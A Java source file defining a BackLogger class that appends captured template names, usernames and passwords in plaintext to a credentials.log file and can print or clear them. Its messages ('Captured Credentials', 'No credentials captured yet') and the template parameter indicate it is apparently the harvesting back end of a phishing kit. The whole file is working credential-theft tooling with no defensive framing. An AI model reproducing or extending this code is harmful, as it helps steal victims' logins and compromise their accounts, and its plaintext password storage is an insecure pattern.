package org.guercifzone.Simple.BackClasses;

import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.text.SimpleDateFormat;
import java.util.Date;

public class BackLogger {
    private static final String LOG_FILE = "credentials.log";
    private static final SimpleDateFormat DATE_FORMAT = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");

    public static void log(String template, String username, String password) {
        String timestamp = DATE_FORMAT.format(new Date());
        String logEntry = String.format("[%s] Template: %s | Username: %s | Password: %s%n",
                timestamp, template, username, password);

        try (FileWriter fw = new FileWriter(LOG_FILE, true);
             BufferedWriter bw = new BufferedWriter(fw);
             PrintWriter out = new PrintWriter(bw)) {
            out.print(logEntry);
        } catch (IOException e) {
            System.err.println("Error writing to log file: " + e.getMessage());
        }
    }
    // Add these methods to the CredentialLogger class
    public static String getLogsAsString() {
        try {
            return new String(Files.readAllBytes(Paths.get(LOG_FILE)));
        } catch (IOException e) {
            return "No credentials captured yet or error reading logs.";
        }
    }

    public static void clearLogs() {
        try {
            Files.write(Paths.get(LOG_FILE), new byte[0]);
        } catch (IOException e) {
            System.err.println("Error clearing log file: " + e.getMessage());
        }
    }
    public static void viewLogs() {
        System.out.println("\n--- Captured Credentials ---");
        try (BufferedReader reader = new BufferedReader(new FileReader(LOG_FILE))) {
            String line;
            while ((line = reader.readLine()) != null) {
                System.out.println(line);
            }
        } catch (FileNotFoundException e) {
            System.out.println("No credentials captured yet.");
        } catch (IOException e) {
            System.err.println("Error reading log file: " + e.getMessage());
        }
        System.out.println("--------------------------");
    }
}
